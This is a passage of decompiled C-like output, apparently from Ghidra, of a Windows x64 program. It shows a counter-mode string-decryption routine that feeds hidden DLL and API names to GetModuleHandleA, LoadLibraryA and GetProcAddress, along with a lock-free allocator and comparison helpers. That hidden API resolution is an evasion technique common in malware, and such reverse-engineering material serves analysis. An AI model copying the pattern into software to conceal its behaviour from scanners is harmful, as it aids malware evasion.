  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019594,0x12);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_1400342b0 = (FARPROC)0x0;
  }
  else {
    _DAT_1400342b0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x1400195c1,0x10);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342b8 = (FARPROC)0x0;
  }
  else {
    DAT_1400342b8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dcbc,0x13);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342c0 = (FARPROC)0x0;
  }
  else {
    DAT_1400342c0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x1400195d1,0x15);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342c8 = (FARPROC)0x0;
  }
  else {
    DAT_1400342c8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x1400195e6,0x15);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342d0 = (FARPROC)0x0;
  }
  else {
    DAT_1400342d0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dccf,0x14);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342d8 = (FARPROC)0x0;
  }
  else {
    DAT_1400342d8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dce3,0x1b);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342e0 = (FARPROC)0x0;
  }
  else {
    DAT_1400342e0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dcfe,0xf);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342e8 = (FARPROC)0x0;
  }
  else {
    DAT_1400342e8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14001962f,0xc);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342f0 = (FARPROC)0x0;
  }
  else {
    DAT_1400342f0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd0d,0x18);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400342f8 = (FARPROC)0x0;
  }
  else {
    DAT_1400342f8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd25,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034300 = (FARPROC)0x0;
  }
  else {
    DAT_140034300 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd33,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034308 = (FARPROC)0x0;
  }
  else {
    DAT_140034308 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd40,0x12);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034310 = (FARPROC)0x0;
  }
  else {
    DAT_140034310 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd52,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034318 = (FARPROC)0x0;
  }
  else {
    DAT_140034318 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd5f,0xf);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034320 = (FARPROC)0x0;
  }
  else {
    DAT_140034320 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dd6e,0xb);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034328 = (FARPROC)0x0;
  }
  else {
    DAT_140034328 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019655,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034330 = (FARPROC)0x0;
  }
  else {
    DAT_140034330 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019663,0x13);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034338 = (FARPROC)0x0;
  }
  else {
    DAT_140034338 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019676,0x10);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034340 = (FARPROC)0x0;
  }
  else {
    DAT_140034340 = GetProcAddress(pHVar2,pCVar1);
  }
  return;
}


// ==== FUN_14000ad55 @ 14000ad55 size 271

undefined8 FUN_14000ad55(char *param_1,ulonglong param_2,char *param_3,ulonglong param_4)

{
  char *pcVar1;
  char *pcVar2;
  uint uVar3;
  longlong lVar5;
  longlong lVar6;
  char *pcVar7;
  bool bVar8;
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  longlong local_28 [4];
  ulonglong uVar4;
  
  pcVar7 = param_1;
  if (param_2 == 0) {
    pcVar7 = (char *)0x1;
  }
  if (param_4 == 0) {
    param_3 = (char *)0x1;
  }
  if (param_2 == param_4) {
    if (pcVar7 == param_3 || param_2 == 0) {
      return 1;
    }
    if (param_2 < 0x11) {
      if (param_2 < 4) {
        uVar4 = 0;
        bVar8 = param_1[param_2 >> 1] == param_3[param_2 >> 1] &&
                (param_1[param_2 - 1] == param_3[param_2 - 1] && *param_1 == *param_3);
      }
      else {
        local_28[0] = 0;
        local_28[2] = (longlong)((uint)(param_2 >> 1) & 0xc);
        local_28[1] = param_2 - 4;
        local_28[3] = (param_2 - 4) - local_28[2];
        uVar4 = 0;
        for (lVar6 = 0; lVar6 != 4; lVar6 = lVar6 + 1) {
          uVar4 = (ulonglong)
                  ((uint)uVar4 |
                  *(uint *)(param_3 + local_28[lVar6]) ^ *(uint *)(pcVar7 + local_28[lVar6]));
        }
        bVar8 = (uint)uVar4 == 0;
      }
LAB_14000ae5b:
      return CONCAT71((int7)(uVar4 >> 8),bVar8);
    }
    lVar6 = (param_2 - 1 >> 4) + 1;
    lVar5 = 0;
    do {
      lVar6 = lVar6 + -1;
      if (lVar6 == 0) {
        pcVar7 = pcVar7 + (param_2 - 0x10);
        pcVar1 = param_3 + (param_2 - 0x10);
        auVar10[0] = -(*pcVar1 == *pcVar7);
        auVar10[1] = -(pcVar1[1] == pcVar7[1]);
        auVar10[2] = -(pcVar1[2] == pcVar7[2]);
        auVar10[3] = -(pcVar1[3] == pcVar7[3]);
        auVar10[4] = -(pcVar1[4] == pcVar7[4]);
        auVar10[5] = -(pcVar1[5] == pcVar7[5]);
        auVar10[6] = -(pcVar1[6] == pcVar7[6]);
        auVar10[7] = -(pcVar1[7] == pcVar7[7]);
        auVar10[8] = -(pcVar1[8] == pcVar7[8]);
        auVar10[9] = -(pcVar1[9] == pcVar7[9]);
        auVar10[10] = -(pcVar1[10] == pcVar7[10]);
        auVar10[0xb] = -(pcVar1[0xb] == pcVar7[0xb]);
        auVar10[0xc] = -(pcVar1[0xc] == pcVar7[0xc]);
        auVar10[0xd] = -(pcVar1[0xd] == pcVar7[0xd]);
        auVar10[0xe] = -(pcVar1[0xe] == pcVar7[0xe]);
        auVar10[0xf] = -(pcVar1[0xf] == pcVar7[0xf]);
        uVar3 = (ushort)((ushort)(SUB161(auVar10 >> 7,0) & 1) |
                         (ushort)(SUB161(auVar10 >> 0xf,0) & 1) << 1 |
                         (ushort)(SUB161(auVar10 >> 0x17,0) & 1) << 2 |
                         (ushort)(SUB161(auVar10 >> 0x1f,0) & 1) << 3 |
                         (ushort)(SUB161(auVar10 >> 0x27,0) & 1) << 4 |
                         (ushort)(SUB161(auVar10 >> 0x2f,0) & 1) << 5 |
                         (ushort)(SUB161(auVar10 >> 0x37,0) & 1) << 6 |
                         (ushort)(SUB161(auVar10 >> 0x3f,0) & 1) << 7 |
                         (ushort)(SUB161(auVar10 >> 0x47,0) & 1) << 8 |
                         (ushort)(SUB161(auVar10 >> 0x4f,0) & 1) << 9 |
                         (ushort)(SUB161(auVar10 >> 0x57,0) & 1) << 10 |
                         (ushort)(SUB161(auVar10 >> 0x5f,0) & 1) << 0xb |
                         (ushort)(SUB161(auVar10 >> 0x67,0) & 1) << 0xc |
                         (ushort)(SUB161(auVar10 >> 0x6f,0) & 1) << 0xd |
                         (ushort)(SUB161(auVar10 >> 0x77,0) & 1) << 0xe |
                        (ushort)(auVar10[0xf] >> 7) << 0xf) ^ 0xffff;
        uVar4 = (ulonglong)uVar3;
        bVar8 = uVar3 == 0;
        goto LAB_14000ae5b;
      }
      pcVar1 = pcVar7 + lVar5;
      pcVar2 = param_3 + lVar5;
      lVar5 = lVar5 + 0x10;
      auVar9[0] = -(*pcVar2 == *pcVar1);
      auVar9[1] = -(pcVar2[1] == pcVar1[1]);
      auVar9[2] = -(pcVar2[2] == pcVar1[2]);
      auVar9[3] = -(pcVar2[3] == pcVar1[3]);
      auVar9[4] = -(pcVar2[4] == pcVar1[4]);
      auVar9[5] = -(pcVar2[5] == pcVar1[5]);
      auVar9[6] = -(pcVar2[6] == pcVar1[6]);
      auVar9[7] = -(pcVar2[7] == pcVar1[7]);
      auVar9[8] = -(pcVar2[8] == pcVar1[8]);
      auVar9[9] = -(pcVar2[9] == pcVar1[9]);
      auVar9[10] = -(pcVar2[10] == pcVar1[10]);
      auVar9[0xb] = -(pcVar2[0xb] == pcVar1[0xb]);
      auVar9[0xc] = -(pcVar2[0xc] == pcVar1[0xc]);
      auVar9[0xd] = -(pcVar2[0xd] == pcVar1[0xd]);
      auVar9[0xe] = -(pcVar2[0xe] == pcVar1[0xe]);
      auVar9[0xf] = -(pcVar2[0xf] == pcVar1[0xf]);
    } while ((ushort)((ushort)(SUB161(auVar9 >> 7,0) & 1) |
                      (ushort)(SUB161(auVar9 >> 0xf,0) & 1) << 1 |
                      (ushort)(SUB161(auVar9 >> 0x17,0) & 1) << 2 |
                      (ushort)(SUB161(auVar9 >> 0x1f,0) & 1) << 3 |
                      (ushort)(SUB161(auVar9 >> 0x27,0) & 1) << 4 |
                      (ushort)(SUB161(auVar9 >> 0x2f,0) & 1) << 5 |
                      (ushort)(SUB161(auVar9 >> 0x37,0) & 1) << 6 |
                      (ushort)(SUB161(auVar9 >> 0x3f,0) & 1) << 7 |
                      (ushort)(SUB161(auVar9 >> 0x47,0) & 1) << 8 |
                      (ushort)(SUB161(auVar9 >> 0x4f,0) & 1) << 9 |
                      (ushort)(SUB161(auVar9 >> 0x57,0) & 1) << 10 |
                      (ushort)(SUB161(auVar9 >> 0x5f,0) & 1) << 0xb |
                      (ushort)(SUB161(auVar9 >> 0x67,0) & 1) << 0xc |
                      (ushort)(SUB161(auVar9 >> 0x6f,0) & 1) << 0xd |
                      (ushort)(SUB161(auVar9 >> 0x77,0) & 1) << 0xe |
                     (ushort)(auVar9[0xf] >> 7) << 0xf) == 0xffff);
  }
  return 0;
}


// ==== FUN_14000ae64 @ 14000ae64 size 308

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000ae64(longlong param_1,longlong param_2,ulonglong param_3)

{
  char *pcVar1;
  ulonglong uVar2;
  longlong lVar3;
  ulonglong uVar4;
  undefined1 *puVar5;
  uint *puVar6;
  uint *puVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  bool bVar10;
  uint local_248 [60];
  uint local_158 [60];
  byte local_68 [16];
  undefined8 local_58;
  undefined8 uStack_50;
  longlong local_48;
  
  if (DAT_140034790 == '\0') {
    FUN_140006155(local_248,(uint *)&DAT_140017388);
    puVar6 = local_248;
    puVar5 = &DAT_1400346a0;
    for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar5 = (char)*puVar6;
      puVar6 = (uint *)((longlong)puVar6 + 1);
      puVar5 = puVar5 + 1;
    }
    DAT_140034790 = '\x01';
  }
  else {
    puVar5 = &DAT_1400346a0;
    puVar6 = local_248;
    for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined1 *)puVar6 = *puVar5;
      puVar5 = puVar5 + 1;
      puVar6 = (uint *)((longlong)puVar6 + 1);
    }
  }
  puVar6 = local_248;
  puVar7 = local_158;
  for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(char *)puVar7 = (char)*puVar6;
    puVar6 = (uint *)((longlong)puVar6 + 1);
    puVar7 = (uint *)((longlong)puVar7 + 1);
  }
  local_58 = _DAT_1400173a8;
  uStack_50 = _UNK_1400173b0;
  uVar8 = 0;
  uVar4 = param_3;
  local_48 = param_1;
  do {
    uVar9 = 0x10;
    if (uVar4 < 0x10) {
      uVar9 = uVar4;
    }
    if (param_3 <= uVar8) {
      *(undefined1 *)(local_48 + param_3) = 0;
      return;
    }
    FUN_1400058a8(local_158,(undefined8 *)local_68,(uint *)&local_58);
    lVar3 = 0xf;
    do {
      pcVar1 = (char *)((longlong)&local_58 + lVar3);
      *pcVar1 = *pcVar1 + '\x01';
      bVar10 = lVar3 == 0;
      lVar3 = lVar3 + -1;
      if (bVar10) break;
    } while (*pcVar1 == '\0');
    for (uVar2 = 0; uVar9 != uVar2; uVar2 = uVar2 + 1) {
      *(byte *)(param_1 + uVar2) = local_68[uVar2] ^ *(byte *)(param_2 + uVar2);
    }
    uVar8 = uVar8 + 0x10;
    uVar4 = uVar4 - 0x10;
    param_2 = param_2 + 0x10;
    param_1 = param_1 + 0x10;
  } while( true );
}


// ==== FUN_14000af98 @ 14000af98 size 42

longlong FUN_14000af98(longlong param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  
  lVar1 = *(longlong *)(param_1 + 0x10);
  lVar2 = *(longlong *)(lVar1 + 8);
  lVar3 = lVar2;
  if (lVar1 + lVar2 + 0x18 == param_2 + param_3) {
    LOCK();
    lVar3 = *(longlong *)(lVar1 + 8);
    if (lVar2 == lVar3) {
      *(longlong *)(lVar1 + 8) = lVar2 - param_3;
      lVar3 = lVar2;
    }
    UNLOCK();
  }
  return lVar3;
}


// ==== FUN_14000afc2 @ 14000afc2 size 46

longlong FUN_14000afc2(longlong param_1,longlong param_2,ulonglong param_3,undefined8 param_4,
                      ulonglong param_5)

{
  ulonglong uVar1;
  longlong lVar2;
  
  uVar1 = FUN_14000aff0(param_1,param_2,param_3,param_4,param_5);
  lVar2 = 0;
  if ((uVar1 & 1) != 0) {
    lVar2 = param_2;
  }
  return lVar2;
}


// ==== FUN_14000aff0 @ 14000aff0 size 119

ulonglong FUN_14000aff0(longlong param_1,longlong param_2,ulonglong param_3,undefined8 param_4,
                       ulonglong param_5)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  longlong lVar3;
  undefined7 uVar5;
  ulonglong uVar4;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  bool bVar9;
  
  puVar1 = *(ulonglong **)(param_1 + 0x10);
  uVar2 = puVar1[1];
  lVar3 = (longlong)puVar1 + uVar2 + 0x18;
  uVar5 = (undefined7)((ulonglong)lVar3 >> 8);
  if (lVar3 == param_2 + param_3) {
    uVar8 = param_5 - param_3;
    if (param_5 < param_3 || uVar8 == 0) {
      LOCK();
      if (uVar2 == puVar1[1]) {
        puVar1[1] = uVar8 + uVar2;
      }
      UNLOCK();
      uVar4 = CONCAT71(uVar5,1);
    }
    else {
      uVar6 = (*puVar1 & 0xfffffffffffffffe) - 0x18;
      uVar4 = 0;
      uVar7 = 0;
      if (uVar2 <= uVar6) {
        uVar7 = uVar6 - uVar2;
      }
      if (uVar8 <= uVar7) {
        LOCK();
        bVar9 = uVar2 == puVar1[1];
        if (bVar9) {
          puVar1[1] = uVar8 + uVar2;
        }
        UNLOCK();
        uVar4 = (ulonglong)bVar9;
      }
    }
  }
  else {
    uVar4 = CONCAT71(uVar5,param_5 <= param_3);
  }
  return uVar4 & 0xffffffff;
}


// ==== FUN_14000b067 @ 14000b067 size 970

longlong FUN_14000b067(undefined8 *param_1,longlong param_2,byte param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong *puVar5;
  ulonglong *puVar6;
  ulonglong *puVar7;
  ulonglong *puVar8;
  ulonglong uVar9;
  ulonglong *puVar10;
  ulonglong uVar11;
  ulonglong *puVar12;
  longlong lVar13;
  ulonglong *puVar14;
  bool bVar15;
  undefined8 unaff_retaddr;
  ulonglong *local_78;
  
  puVar6 = (ulonglong *)0x0;
  puVar14 = (ulonglong *)param_1[2];
LAB_14000b0b8:
  do {
    puVar7 = puVar14 + 3;
    while (puVar14 != (ulonglong *)0x0) {
      uVar3 = *puVar14;
      lVar13 = (1L << (param_3 & 0x3f)) + param_2 + -1;
      LOCK();
      puVar12 = puVar14 + 1;
      uVar11 = *puVar12;
      *puVar12 = *puVar12 + lVar13;
      UNLOCK();
      lVar1 = FUN_14000b459((longlong)puVar7,uVar11,param_3);
      uVar11 = uVar11 + lVar13;
      uVar4 = lVar1 + param_2;
      if (uVar11 != uVar4) {
        LOCK();
        if (uVar11 == puVar14[1]) {
          puVar14[1] = uVar4;
        }
        UNLOCK();
      }
      uVar11 = (uVar3 & 0xfffffffffffffffe) - 0x18;
      if (uVar4 <= uVar11) {
LAB_14000b397:
        lVar1 = (longlong)puVar7 + lVar1;
        if (puVar6 == (ulonglong *)0x0) {
          return lVar1;
        }
        puVar6[2] = 0;
        goto LAB_14000b3ac;
      }
      uVar4 = *puVar14;
      do {
        LOCK();
        uVar3 = *puVar14;
        bVar15 = uVar4 == uVar3;
        if (bVar15) {
          *puVar14 = uVar4 | 1;
          uVar3 = uVar4;
        }
        UNLOCK();
        uVar4 = uVar3;
      } while (!bVar15);
      if ((uVar3 & 1) != 0) goto LAB_14000b1bf;
      uVar4 = puVar14[1];
      lVar1 = FUN_14000b459((longlong)puVar7,uVar4,param_3);
      uVar9 = param_2 + 0x19 + lVar1 & 0xfffffffffffffffe;
      if (uVar3 < uVar9) {
        uVar2 = (**(code **)(param_1[1] + 8))(*param_1,puVar14,uVar3,3,uVar9,unaff_retaddr);
        if ((uVar2 & 1) != 0) {
          LOCK();
          bVar15 = uVar4 == puVar14[1];
          if (bVar15) {
            puVar14[1] = param_2 + lVar1;
          }
          UNLOCK();
          uVar3 = uVar9;
          if (bVar15) {
            *puVar14 = uVar9;
            goto LAB_14000b397;
          }
        }
        *puVar14 = uVar3;
        goto LAB_14000b1bf;
      }
      *puVar14 = uVar3;
    }
    uVar11 = 0;
LAB_14000b1bf:
    LOCK();
    puVar7 = (ulonglong *)param_1[3];
    param_1[3] = 0;
    UNLOCK();
    if (puVar7 != (ulonglong *)0x0) {
      puVar10 = (ulonglong *)0x0;
      puVar12 = (ulonglong *)0x0;
      uVar4 = 0xffffffffffffffff;
      local_78 = (ulonglong *)0x0;
      puVar5 = puVar7;
      while (puVar8 = puVar5, puVar8 != (ulonglong *)0x0) {
        uVar9 = (*puVar8 & 0xfffffffffffffffe) - 0x18;
        lVar1 = FUN_14000b459((longlong)(puVar8 + 3),0,param_3);
        uVar3 = (lVar1 + param_2) - uVar9;
        if ((ulonglong)(lVar1 + param_2) < uVar9) {
          uVar3 = 0;
        }
        if (uVar3 < uVar4) {
          uVar4 = uVar3;
          puVar12 = puVar8;
          puVar10 = local_78;
        }
        local_78 = puVar8;
        puVar5 = (ulonglong *)puVar8[2];
      }
      uVar4 = *puVar12;
      lVar1 = FUN_14000b459((longlong)(puVar12 + 3),0,param_3);
      if ((uVar4 & 0xfffffffffffffffe) - 0x18 < (ulonglong)(lVar1 + param_2)) {
        uVar3 = param_2 + 0x19 + lVar1 & 0xfffffffffffffffe;
        uVar4 = (**(code **)(param_1[1] + 8))
                          (*param_1,puVar12,uVar4 & 0xfffffffffffffffe,3,uVar3,unaff_retaddr);
        if ((uVar4 & 1) == 0) {
          FUN_14000b431((longlong)param_1,(longlong)puVar7,(longlong)local_78);
          goto LAB_14000b301;
        }
        *puVar12 = uVar3;
      }
      puVar8 = (ulonglong *)puVar12[2];
      puVar12[1] = lVar1 + param_2;
      puVar12[2] = (ulonglong)puVar14;
      LOCK();
      puVar5 = (ulonglong *)param_1[2];
      bVar15 = puVar14 == puVar5;
      if (bVar15) {
        param_1[2] = puVar12;
        puVar5 = puVar14;
      }
      UNLOCK();
      if (bVar15) {
        if (puVar10 != (ulonglong *)0x0) {
          puVar10[2] = (ulonglong)puVar8;
        }
        if (puVar12 != puVar7) {
          puVar8 = puVar7;
        }
        if (puVar8 != (ulonglong *)0x0) {
          if (puVar12 != local_78) {
            puVar10 = local_78;
          }
          FUN_14000b431((longlong)param_1,(longlong)puVar8,(longlong)puVar10);
        }
        lVar1 = (longlong)(puVar12 + 3) + lVar1;
        if (puVar6 == (ulonglong *)0x0) {
          return lVar1;
        }
        puVar6[2] = 0;
LAB_14000b3ac:
        FUN_14000b431((longlong)param_1,(longlong)puVar6,(longlong)puVar6);
        return lVar1;
      }
      puVar12[2] = (ulonglong)puVar8;
      FUN_14000b431((longlong)param_1,(longlong)puVar7,(longlong)local_78);
      puVar14 = puVar5;
      goto LAB_14000b0b8;
    }
LAB_14000b301:
    if (puVar6 == (ulonglong *)0x0) {
      uVar4 = uVar11 + param_2 + 0x28 + (1L << (param_3 & 0x3f));
      uVar4 = (uVar4 >> 1) + uVar4 + 1 & 0xfffffffffffffffe;
      puVar6 = (ulonglong *)(**(code **)param_1[1])(*param_1,uVar4,3,unaff_retaddr);
      if (puVar6 == (ulonglong *)0x0) {
        return 0;
      }
      *puVar6 = uVar4;
    }
    lVar1 = FUN_14000b459((longlong)(puVar6 + 3),0,param_3);
    puVar6[1] = param_2 + lVar1;
    puVar6[2] = (ulonglong)puVar14;
    LOCK();
    puVar7 = (ulonglong *)param_1[2];
    bVar15 = puVar14 == puVar7;
    if (bVar15) {
      param_1[2] = puVar6;
      puVar7 = puVar14;
    }
    UNLOCK();
    puVar14 = puVar7;
    if (bVar15) {
      return (longlong)(puVar6 + 3) + lVar1;
    }
  } while( true );
}


// ==== FUN_14000b431 @ 14000b431 size 40

void FUN_14000b431(longlong param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  bool bVar3;
  longlong lVar2;
  
  lVar2 = *(longlong *)(param_3 + 0x10);
  while( true ) {
    LOCK();
    lVar1 = *(longlong *)(param_1 + 0x18);
    bVar3 = lVar2 == lVar1;
    if (bVar3) {
      *(longlong *)(param_1 + 0x18) = param_2;
      lVar1 = lVar2;
    }
    UNLOCK();
    if (bVar3) break;
    *(longlong *)(param_3 + 0x10) = lVar1;
    lVar2 = lVar1;
  }
  return;
}


// ==== FUN_14000b459 @ 14000b459 size 50

longlong FUN_14000b459(longlong param_1,longlong param_2,byte param_3)

{
  ulonglong uVar1;
  
  uVar1 = -1L << (param_3 & 0x3f);
  return (~uVar1 + param_2 + param_1 & uVar1) - param_1;
}


// ==== FUN_14000b48b @ 14000b48b size 78

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong * FUN_14000b48b(longlong *param_1,undefined8 *param_2,longlong param_3)

{
  longlong lVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  
  uVar2 = _DAT_14002ddb0;
  uVar3 = _UNK_14002ddb4;
  uVar4 = _UNK_14002ddb8;
  uVar5 = _UNK_14002ddbc;
  if ((param_3 == 0) ||
     (lVar1 = (**(code **)param_2[1])(*param_2,param_3,3), uVar2 = _DAT_14002dda0,
     uVar3 = _UNK_14002dda4, uVar4 = _UNK_14002dda8, uVar5 = _UNK_14002ddac, lVar1 == 0)) {
    *(undefined4 *)param_1 = uVar2;
    *(undefined4 *)((longlong)param_1 + 4) = uVar3;
    *(undefined4 *)(param_1 + 1) = uVar4;
    *(undefined4 *)((longlong)param_1 + 0xc) = uVar5;
  }
  else {
    *(undefined2 *)(param_1 + 1) = 0;
    *param_1 = lVar1;
  }
  return param_1;
}


// ==== FUN_14000b4d9 @ 14000b4d9 size 55

void FUN_14000b4d9(undefined4 *param_1,longlong param_2,longlong param_3,undefined4 *param_4)

{
  longlong lVar1;
  undefined4 *puVar2;
  bool bVar3;
  
  lVar1 = param_3;
  while (bVar3 = lVar1 != 0, lVar1 = lVar1 + -1, bVar3) {
    *(undefined1 *)(*(longlong *)(param_2 + 0x28) + *(longlong *)(param_2 + 0x40)) = 0x5c;
    *(longlong *)(param_2 + 0x40) = *(longlong *)(param_2 + 0x40) + 1;
  }
  puVar2 = &DAT_14002ddc0;
  if (param_3 == 0) {
    puVar2 = param_4;
  }
  *param_1 = *puVar2;
  return;
}


// ==== FUN_14000b510 @ 14000b510 size 255

